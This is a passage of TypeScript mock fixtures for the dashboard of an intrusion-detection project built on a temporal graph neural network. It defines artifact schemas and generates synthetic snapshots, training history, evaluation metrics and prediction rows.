  { name: 'first_seen_ts', type: 'float64', nullable: false, description: 'First event ts touching this node' },
  { name: 'last_seen_ts', type: 'float64', nullable: false, description: 'Last event ts touching this node' },
  { name: 'out_degree', type: 'int64', nullable: false, description: 'Outgoing edge count' },
  { name: 'in_degree', type: 'int64', nullable: false, description: 'Incoming edge count' },
  { name: 'malicious_events', type: 'int64', nullable: false, description: 'Count of malicious events touching this node' },
];

const CHAIN_SCHEMA: ArtifactSchemaField[] = [
  { name: 'chain_id', type: 'string', nullable: false, description: 'Chain identifier' },
  { name: 'strategy', type: 'string', nullable: false, description: 'ChainStrategy: chain_id | causal_parent | entity_time' },
  { name: 'num_events', type: 'int64', nullable: false, description: 'Events in chain' },
  { name: 'num_nodes', type: 'int64', nullable: false, description: 'Distinct nodes in chain' },
  { name: 'start_ts', type: 'float64', nullable: false, description: 'Earliest event ts' },
  { name: 'end_ts', type: 'float64', nullable: false, description: 'Latest event ts' },
  { name: 'duration_s', type: 'float64', nullable: false, description: 'end_ts - start_ts' },
  { name: 'tactic_sequence', type: 'list<string>', nullable: false, description: 'Run-length-compressed tactics' },
  { name: 'stage_sequence', type: 'list<string>', nullable: false, description: 'apt_stage per event' },
  { name: 'relation_sequence', type: 'list<string>', nullable: false, description: 'relation per event' },
  { name: 'nodes', type: 'list<string>', nullable: false, description: 'Distinct node ids' },
  { name: 'event_ids', type: 'list<string>', nullable: false, description: 'Ordered event ids' },
];

const STATS_SCHEMA: ArtifactSchemaField[] = [
  { name: 'dataset', type: 'string', nullable: false, description: 'Dataset name' },
  { name: 'input', type: 'string', nullable: false, description: 'Raw input path' },
  { name: 'elapsed_s', type: 'float64', nullable: false, description: 'Build elapsed seconds' },
  { name: 'normalization', type: 'object', nullable: false, description: 'NormalizationStats dict' },
  { name: 'labeling', type: 'object', nullable: false, description: 'LabelingStats dict' },
  { name: 'graph', type: 'object', nullable: false, description: 'GraphSummaryStats dict' },
  { name: 'attacks', type: 'object', nullable: false, description: 'AttackSummaryStats dict' },
  { name: 'outputs', type: 'object', nullable: false, description: 'Output artifact paths' },
];

export function mockArtifacts(jobId: string): ArtifactMeta[] {
  const job = mockJobById(jobId);
  if (!job) return [];
  const base = job.output_dir.replace(/\/$/, '');
  return [
    {
      kind: 'events',
      path: `${base}/events.parquet`,
      format: 'parquet',
      size_bytes: 92_410,
      row_count: mockGraphStats().graph.total_events,
      schema: EVENT_SCHEMA,
      preview: mockEvents().slice(0, 5).map((e) => ({ ...e, attrs: JSON.stringify(e.attrs), tactics: e.tactics.join('|') })),
    },
    {
      kind: 'edges',
      path: `${base}/edges.parquet`,
      format: 'parquet',
      size_bytes: 58_320,
      row_count: mockEdges().length,
      schema: EDGE_SCHEMA,
      preview: mockEdges().slice(0, 5),
    },
    {
      kind: 'nodes',
      path: `${base}/nodes.parquet`,
      format: 'parquet',
      size_bytes: 18_240,
      row_count: mockNodes().length,
      schema: NODE_SCHEMA,
      preview: mockNodes().slice(0, 5),
    },
    {
      kind: 'chains_summary',
      path: `${base}/chains_summary.parquet`,
      format: 'parquet',
      size_bytes: 4_812,
      row_count: mockChainsPrimary().length,
      schema: CHAIN_SCHEMA,
      preview: mockChainsPrimary().slice(0, 5),
    },
    {
      kind: 'graph_stats',
      path: `${base}/graph_stats.json`,
      format: 'json',
      size_bytes: 2_412,
      row_count: 1,
      schema: STATS_SCHEMA,
      preview: [mockGraphStats()],
    },
    {
      kind: 'subgraph',
      path: `${job.graphs_dir ?? base + '/chains'}`,
      format: 'json_dir',
      size_bytes: 28_810,
      row_count: mockSubgraphs().length,
      schema: [
        { name: 'chain_id', type: 'string', nullable: false, description: 'Chain identifier' },
        { name: 'strategy', type: 'string', nullable: false, description: 'Reconstruction strategy' },
        { name: 'nodes', type: 'list<object>', nullable: false, description: 'Array of {id, node_type}' },
        { name: 'edges', type: 'list<object>', nullable: false, description: 'Array of edge objects with tactics + apt_stage' },
      ],
      preview: mockSubgraphs().slice(0, 1),
    },
  ];
}

// ─────────────────────────────────────────────────────────────────────────────
// Snapshot fixtures (graph_builder/temporal.py output)
// ─────────────────────────────────────────────────────────────────────────────

const SNAPSHOT_META: SnapshotMeta = {
  dataset: 'mixed_chains',
  window_size_s: 60,
  stride_s: 30,
  num_snapshots: 612,
  node_feature_mode: 'type_degree',
  edge_feature_mode: 'relation_time',
  num_node_types: 8,
  num_relations: 14,
  node_feature_dim: 12, // 8 one-hot type + 4 numerical
  edge_feature_dim: 15, // 14 relation one-hot + 1 relative ts
  earliest_ts: BASE_T,
  latest_ts: BASE_T + 18_000,
};

function buildSnapshots(): SnapshotInfo[] {
  const out: SnapshotInfo[] = [];
  const total = SNAPSHOT_META.num_snapshots;
  const startTs = SNAPSHOT_META.earliest_ts;
  for (let i = 0; i < total; i++) {
    const windowStart = startTs + i * SNAPSHOT_META.stride_s;
    const windowEnd = windowStart + SNAPSHOT_META.window_size_s;
    // Sparse activity in most windows; concentrated in windows 100–260 (where attacks live).
    const inAttack = i >= 100 && i <= 260;
    const r = stableRng();
    const num_edges = inAttack ? Math.floor(20 + r * 60) : Math.floor(2 + r * 8);
    const num_nodes = Math.floor(num_edges * 0.7);
    const num_mal_edges = inAttack ? Math.floor(num_edges * (0.2 + r * 0.4)) : 0;
    const num_mal_nodes = Math.floor(num_mal_edges * 0.8);
    out.push({
      index: i,
      window_start_ts: windowStart,
      window_end_ts: windowEnd,
      num_nodes,
      num_edges,
      num_malicious_nodes: num_mal_nodes,
      num_malicious_edges: num_mal_edges,
      snapshot_label: num_mal_edges > 0 ? 1 : 0,
    });
  }
  return out;
}

const SNAPSHOTS = buildSnapshots();

export function mockSnapshotMeta(): SnapshotMeta {
  return SNAPSHOT_META;
}
export function mockSnapshots(limit?: number): SnapshotInfo[] {
  return limit ? SNAPSHOTS.slice(0, limit) : SNAPSHOTS;
}

// ─────────────────────────────────────────────────────────────────────────────
// TGNN model fixtures (models/tgnn.py)
// ─────────────────────────────────────────────────────────────────────────────

const TGNN_CONFIG: TGNNModelConfig = {
  in_channels: 12,
  edge_dim: 15,
  hidden_channels: 64,
  out_channels: 64,
  num_gnn_layers: 2,
  num_rnn_layers: 1,
  dropout: 0.3,
  node_types: 8,
  num_relations: 14,
};

const TGNN_SUMMARY: TGNNModelSummary = {
  architecture: 'TemporalGNN',
  gnn_operator: 'GraphSAGE (SAGEConv)',
  temporal_aggregator: 'GRU',
  output_heads: ['node_classifier', 'snapshot_classifier'],
  loss: 'BCEWithLogitsLoss',
  has_attention: false,
  has_transformer: false,
  has_llm: false,
  config: TGNN_CONFIG,
};

export function mockTGNNConfig(): TGNNModelConfig {
  return TGNN_CONFIG;
}
export function mockTGNNSummary(): TGNNModelSummary {
  return TGNN_SUMMARY;
}

// ─────────────────────────────────────────────────────────────────────────────
// Training run + history fixtures (scripts/train_tgnn.py outputs)
// ─────────────────────────────────────────────────────────────────────────────

function buildTrainingHistory(epochs: number): EpochMetrics[] {
  const out: EpochMetrics[] = [];
  let trainLoss = 0.71;
  let valLoss = 0.72;
  let aucPr = 0.52;
  let aucRoc = 0.55;
  let f1 = 0.12;
  let prec = 0.18;
  let rec = 0.10;
  let acc = 0.62;
  let thresh = 0.5;
  for (let e = 1; e <= epochs; e++) {
    // Convergence curve with mild noise.
    const noise = (stableRng() - 0.5) * 0.04;
    trainLoss = Math.max(0.05, trainLoss * 0.92 + noise * 0.1);
    valLoss = Math.max(0.08, valLoss * 0.93 + noise * 0.15);
    aucPr = Math.min(0.78, aucPr + (0.78 - aucPr) * 0.18 + noise);
    aucRoc = Math.min(0.74, aucRoc + (0.74 - aucRoc) * 0.18 + noise);
    f1 = Math.min(0.71, f1 + (0.71 - f1) * 0.20 + noise);
    prec = Math.min(0.74, prec + (0.74 - prec) * 0.20 + noise);
    rec = Math.min(0.70, rec + (0.70 - rec) * 0.20 + noise);
    acc = Math.min(0.66, acc + (0.66 - acc) * 0.18 + noise);
    thresh = Math.min(0.95, 0.5 + e * 0.022 + noise * 0.05);
    out.push({
      epoch: e,
      train_loss: trainLoss,
      loss: valLoss,
      auc_roc: aucRoc,
      auc_pr: aucPr,
      threshold: thresh,
      f1, accuracy: acc, precision: prec, recall: rec,
    });
  }
  return out;
}

const HISTORY = buildTrainingHistory(20);
const BEST_EPOCH_IDX = HISTORY.reduce((bestIdx, m, i, arr) => (m.auc_pr > arr[bestIdx].auc_pr ? i : bestIdx), 0);

const TRAINING_CONFIG: TrainingConfig = {
  snapshots_dir: 'data/snapshots/mixed_chains',
  out_dir: 'models/checkpoints/mixed_chains',
  epochs: 20,
  batch_size: 8,
  lr: 1e-3,
  weight_decay: 5e-4,
  grad_clip: 1.0,
  hidden_channels: 64,
  out_channels: 64,
  gnn_layers: 2,
  rnn_layers: 1,
  dropout: 0.3,
  window_size: 10,
  seq_stride: 1,
  val_ratio: 0.15,
  test_ratio: 0.15,
  split_mode: 'block',
  block_size: 10,
  select_metric: 'auc_pr',
  no_threshold_tuning: false,
  pos_weight: null,
  seed: 42,
};

const TRAINING_RUN: TrainingRun = {
  id: 'tr_mixed_chains_v1',
  name: 'mixed_chains v1',
  dataset_id: 'ds_mordor_empire',
  config: TRAINING_CONFIG,
  started_at: BASE_T - 86400 * 1,
  ended_at: BASE_T - 86400 * 1 + 1_842,
  elapsed_s: 1_842,
  current_epoch: HISTORY.length,
  total_epochs: HISTORY.length,
  best_epoch: BEST_EPOCH_IDX + 1,
  best_metric: 'auc_pr',
  best_score: HISTORY[BEST_EPOCH_IDX].auc_pr,
  best_val_f1: HISTORY[BEST_EPOCH_IDX].f1,
  threshold: HISTORY[BEST_EPOCH_IDX].threshold,
  history: HISTORY,
  checkpoint_path: 'models/checkpoints/mixed_chains/best_model.pt',
  final_model_path: 'models/checkpoints/mixed_chains/final_model.pt',
  state: 'completed',
  error: null,
};

export function mockTrainingRun(): TrainingRun {
  return TRAINING_RUN;
}
export function mockTrainingHistory(): EpochMetrics[] {
  return HISTORY;
}

// ─────────────────────────────────────────────────────────────────────────────
// Evaluation fixtures (scripts/evaluate_tgnn.py outputs)
// Realistic metrics reflecting an actual run: F1≈0.70, threshold≈0.94
// ─────────────────────────────────────────────────────────────────────────────

function buildEvalMetrics(split: 'train' | 'val' | 'test'): EvaluationMetrics {
  // Numbers inspired by results/mordor_mixed/checkpoints/mordor_mixed/eval_test/metrics_test.json
  const seed = split === 'test' ? 42 : split === 'val' ? 17 : 1;
  const r = makeRng(seed);
  const base = split === 'test'
    ? { n: 20745, pos: 13558, neg: 7187, acc: 0.613, prec: 0.706, rec: 0.699, f1: 0.703, auc_roc: 0.572, auc_pr: 0.678, thresh: 0.943 }
    : split === 'val'
      ? { n: 17200, pos: 11320, neg: 5880, acc: 0.628, prec: 0.712, rec: 0.706, f1: 0.709, auc_roc: 0.581, auc_pr: 0.687, thresh: 0.918 }
      : { n: 69_820, pos: 45_320, neg: 24_500, acc: 0.621, prec: 0.710, rec: 0.704, f1: 0.707, auc_roc: 0.577, auc_pr: 0.682, thresh: 0.921 };
  const noise = () => (r() - 0.5) * 0.005;
  const tp = Math.floor(base.pos * (base.rec + noise()));
  const fn = base.pos - tp;
  const fp = Math.floor(base.neg * (1 - base.prec + noise()) / base.prec * base.rec);
  const tn = base.neg - fp;
  return {
    threshold: base.thresh,
    num_samples: base.n,
    num_positive: base.pos,
    num_negative: base.neg,
    accuracy: base.acc,
    precision: base.prec,
    recall: base.rec,
    f1: base.f1,
    auc_roc: base.auc_roc,
    auc_pr: base.auc_pr,
    confusion_matrix: { tn, fp, fn, tp },
  };
}

const EVAL_RUNS: EvaluationRun[] = [
  {
    id: 'eval_test_v1',
    training_run_id: TRAINING_RUN.id,
    checkpoint_path: TRAINING_RUN.checkpoint_path!,
    split: 'test',
    metrics: buildEvalMetrics('test'),
    predictions_path: 'results/mixed_chains/eval_test/predictions_test.parquet',
    started_at: BASE_T - 86400 * 1 + 1_842,
    ended_at: BASE_T - 86400 * 1 + 1_900,
  },
  {
    id: 'eval_val_v1',
    training_run_id: TRAINING_RUN.id,
    checkpoint_path: TRAINING_RUN.checkpoint_path!,
    split: 'val',
    metrics: buildEvalMetrics('val'),
    predictions_path: 'results/mixed_chains/eval_val/predictions_val.parquet',
    started_at: BASE_T - 86400 * 1 + 1_900,
    ended_at: BASE_T - 86400 * 1 + 1_947,
  },
  {
    id: 'eval_train_v1',
    training_run_id: TRAINING_RUN.id,
    checkpoint_path: TRAINING_RUN.checkpoint_path!,
    split: 'train',
    metrics: buildEvalMetrics('train'),
    predictions_path: 'results/mixed_chains/eval_train/predictions_train.parquet',
    started_at: BASE_T - 86400 * 1 + 1_947,
    ended_at: BASE_T - 86400 * 1 + 2_005,
  },
];

export function mockEvaluationRuns(): EvaluationRun[] {
  return EVAL_RUNS;
}
export function mockEvaluationRun(split: 'train' | 'val' | 'test'): EvaluationRun | null {
  return EVAL_RUNS.find((e) => e.split === split) ?? null;
}

// Sample predictions (predictions_<split>.parquet rows)
function buildPredictions(split: 'train' | 'val' | 'test'): PredictionRow[] {
  const metrics = buildEvalMetrics(split);
  const out: PredictionRow[] = [];
  const r = makeRng(split === 'test' ? 99 : split === 'val' ? 88 : 11);
  const sampleN = 30;
  // Build a node pool from the mock nodes
  const nodePool = mockNodes().slice(0, 12).map((n) => n.node_id);
  for (let i = 0; i < sampleN; i++) {
    const seq = Math.floor(r() * 100);
    const nodeId = pick(nodePool.length ? nodePool : ['user:alice', 'process:cmd.exe', 'host:DC01']);
    const isPos = r() < 0.65;
    const probability = isPos ? 0.85 + r() * 0.14 : r() * 0.4;
    const prediction: EventLabel = probability >= metrics.threshold ? 1 : 0;
    const groundTruth: EventLabel = isPos ? 1 : 0;
    out.push({
      sequence: seq,
      node_id: nodeId,
      probability,
      prediction,
      ground_truth: groundTruth,
      snapshot_label: isPos ? 1 : 0,
    });
  }
  return out;
}

const PREDICTIONS: Record<'train' | 'val' | 'test', PredictionRow[]> = {
  train: buildPredictions('train'),
  val: buildPredictions('val'),
  test: buildPredictions('test'),
};

export function mockPredictions(split: 'train' | 'val' | 'test'): PredictionRow[] {
  return PREDICTIONS[split];
}
